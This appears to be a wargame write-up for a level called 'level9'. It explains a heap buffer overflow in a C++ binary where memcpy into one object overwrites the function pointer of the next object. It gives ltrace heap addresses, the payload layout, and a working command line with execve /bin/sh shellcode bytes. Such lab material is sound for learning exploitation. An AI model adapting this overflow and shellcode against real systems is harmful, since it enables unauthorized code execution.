we can see from binary ninja that the program is probably cpp as the class `N` imply.
![code](./ressources/binja.png)
the end of main call the function pointer of B which is after the memcpy of the buffer in A.
we can overflow the buffer and overwrite the function pointer to execute our shellcode, by overwriting from A to B.

we can see in binary ninja that to execute the operator+, in assembly it actually dereference the first `N` two times : `return (**eax_1)(eax_1, eax)`.

it mean that our exploit needs to include it's own address twice, so that the first dereference point to the string, and the second point to itself, so that the shellcode is executed.
using `ltrace` we can see the 2 addresses of the classes and the call to memcpy giving us the buffer address:

```
_Znwj(108, 0xbffff3d4, 0xbffff3e0, 0xb7d79e55, 0xb7fed280)                         = 0x804a008
_Znwj(108, 5, 0xbffff3e0, 0xb7d79e55, 0xb7fed280)                                  = 0x804a078
memcpy(0x0804a00c, "test", 4)                                                      = 0x0804a00c
```

the difference between the two is 112 bytes, but the class is 108 bytes long, so there is 4 bytes of offset between the two.
the exploit will look like this:
`[own adress 4 bytes + shellcode 25 bytes + filler (108 - 4 - 25) 79 bytes long] + addr of the buffer 4 bytes`
the first part will be copied in the buffer + the 4 bytes separating the two classes, and the second part will overwrite the function pointer.

running it:
`./level9 $(python -c "print '\x0c\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'i'*79 + '\x0c\xa0\x04\x08'")`
